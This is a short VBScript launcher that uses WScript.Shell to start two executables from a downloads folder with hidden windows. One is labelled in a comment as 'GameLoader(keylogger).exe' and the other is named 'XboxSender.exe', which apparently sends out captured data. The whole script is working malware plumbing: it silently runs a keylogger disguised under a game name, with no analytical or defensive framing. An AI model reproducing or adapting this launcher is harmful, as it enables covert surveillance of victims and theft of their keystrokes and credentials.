Set WshShell = CreateObject("WScript.Shell")

' Run GameLoader(keylogger).exe with a hidden window
WshShell.Run """C:\DownloadedFiles\GameLoader.exe""", 0, False

' Run Xbox.exe with a hidden window
WshShell.Run """C:\DownloadedFiles\XboxSender.exe""", 0, False